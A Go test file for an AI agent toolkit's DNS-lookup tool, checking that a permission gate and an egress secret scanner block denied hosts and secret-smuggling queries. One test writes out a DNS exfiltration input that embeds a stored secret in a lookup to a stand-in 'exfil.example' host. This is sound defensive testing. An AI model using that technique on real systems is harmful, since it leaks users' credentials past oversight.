package tools_test

import (
	"context"
	"strings"
	"testing"

	"github.com/efuturetoday/nocturn/agentkit"
	"github.com/efuturetoday/nocturn/agentkit/gate"
	"github.com/efuturetoday/nocturn/internal/secret"
	"github.com/efuturetoday/nocturn/internal/tools"
)

// dnsResolve returns the dns_resolve base tool.
func dnsResolve(t *testing.T, cfg tools.Config) agentkit.Tool {
	t.Helper()
	return toolFrom(t, cfg, "dns_resolve")
}

// TestDNS_GateDeniesUnknownHost is the gate-before-effect guarantee for DNS: a denied host is refused
// before any lookup — proven by denying a host whose lookup would otherwise fail with a resolver error;
// we get gate.ErrDenied instead, so the gate ran first.
func TestDNS_GateDeniesUnknownHost(t *testing.T) {
	resolve := dnsResolve(t, tools.Config{})
	// "invalid." never resolves; if the lookup ran we'd see a resolver error, not ErrDenied.
	_, err := resolve.Call(denyAll(context.Background()), `{"host":"nonexistent.invalid","type":"A"}`)
	if err == nil {
		t.Fatal("denied host was resolved")
	}
	if !strings.Contains(err.Error(), "denied") {
		t.Fatalf("expected a gate denial before the lookup, got %v", err)
	}
}

// TestDNS_Egress_ScansQueriedName is the exfil guard: the queried NAME is the exfiltration surface, so
// a stored vault value embedded in the host is blocked by the egress scan (after the gate allows, before
// the lookup).
func TestDNS_Egress_ScansQueriedName(t *testing.T) {
	store := secret.NewStore()
	store.Set("api", []byte("SUPERSECRETVALUE123"))
	sc := secret.NewScanner(store)

	resolve := dnsResolve(t, tools.Config{Scanner: sc})
	_, err := resolve.Call(allowAll(context.Background()), `{"host":"SUPERSECRETVALUE123.exfil.example","type":"A"}`)
	if err == nil {
		t.Fatal("secret smuggled into the queried name was not blocked")
	}
	if !strings.Contains(err.Error(), "egress blocked") {
		t.Fatalf("expected an egress block, got %v", err)
	}
	if strings.Contains(err.Error(), "SUPERSECRETVALUE123") {
		t.Fatalf("egress error leaked the secret: %v", err)
	}
}

// TestDNS_MissingHost_Rejected proves an empty host is refused before the gate.
func TestDNS_MissingHost_Rejected(t *testing.T) {
	resolve := dnsResolve(t, tools.Config{})
	_, err := resolve.Call(allowAll(context.Background()), `{"host":"","type":"A"}`)
	if err == nil || !strings.Contains(err.Error(), "missing required field: host") {
		t.Fatalf("empty host not clearly rejected: %v", err)
	}
}

// TestDNS_RecordTypeNotAnAuthorityAxis proves the record type is NOT a separate authority axis: the
// gate action is keyed on the host regardless of type, so a host-deny blocks every type equally (a
// different type is not an escape hatch).
func TestDNS_RecordTypeNotAnAuthorityAxis(t *testing.T) {
	var seen []gate.Action
	ctx := capturePolicy(context.Background(), &seen, func(gate.Action) gate.Ruling { return gate.Denied() })
	resolve := dnsResolve(t, tools.Config{})

	for _, typ := range []string{"A", "TXT", "MX"} {
		if _, err := resolve.Call(ctx, `{"host":"blocked.example","type":`+jsonQuote(typ)+`}`); err == nil {
			t.Fatalf("type %q was not gated on the host", typ)
		}
	}
	for _, a := range seen {
		if a.Kind != tools.NetKind || a.Target != "blocked.example" {
			t.Fatalf("dns gated on %+v, want net/blocked.example regardless of type", a)
		}
	}
}

// TestDNS_NormalizeRecordType_DefaultA proves an omitted type defaults to A. It resolves "localhost",
// which is answered from the hosts file without touching the network.
func TestDNS_NormalizeRecordType_DefaultA(t *testing.T) {
	resolve := dnsResolve(t, tools.Config{})
	out, err := resolve.Call(allowAll(context.Background()), `{"host":"localhost"}`)
	if err != nil {
		t.Skipf("localhost did not resolve in this environment: %v", err)
	}
	if !strings.Contains(out, `"type":"A"`) {
		t.Fatalf("omitted type did not default to A: %q", out)
	}
}
